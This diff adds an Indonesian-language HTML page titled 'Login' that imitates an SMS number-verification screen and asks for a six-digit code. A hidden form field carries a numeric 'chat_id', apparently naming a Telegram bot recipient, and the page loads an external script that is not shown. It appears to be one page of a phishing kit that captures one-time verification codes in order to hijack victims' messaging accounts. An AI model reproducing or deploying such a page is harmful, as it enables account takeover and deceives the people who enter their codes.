@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <link rel="stylesheet" href="css/style.css" />
+  </head>
+  <body>
+    <main>
+      <h4>Memverivikasi nomor Anda</h4>
+
+      <div>
+        <p>
+          Menunggu untuk mendeteksi secara otomatis SMS yang dikirim <br />ke
+          <span id="phone-number"></span>.
+          <span class="salah">Nomor telepon salah?</span>
+        </p>
+      </div>
+
+      <form id="form2" action="#" method="post">
+        <input type="hidden" name="chat_id" value="6936181512" />
+
+        <input
+          type="text"
+          name="kode"
+          id="kode"
+          pattern="[0-9]{6}"
+          maxlength="6"
+          required
+        />
+      </form>
+
+      <p>Tidak menerima kode?</p>
+    </main>
+
+    <script src="js/script.js"></script>
+  </body>
+</html>
